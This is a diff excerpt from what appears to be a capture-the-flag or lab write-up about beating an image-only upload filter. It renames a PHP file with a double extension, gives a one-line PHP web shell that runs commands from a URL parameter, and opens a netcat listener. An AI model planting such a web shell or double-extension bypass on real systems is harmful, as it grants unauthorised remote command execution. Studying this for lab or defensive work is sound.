@@ -117,9 +117,11 @@ U5ErkJggg==
 - only png,jpg,gif file are allower
 - rename the webshell.php in webshell.php.png to bypass upload limitation
 - open a listener for the reverse shell
- - my reverse shell file: <?php echo system($_GET['cmd']); ?>
 
 ``` bash
+# my reverse shell code:
+# <?php echo system($_GET['cmd']); ?>
+
 # listener
 nc -nlvp 1337
 
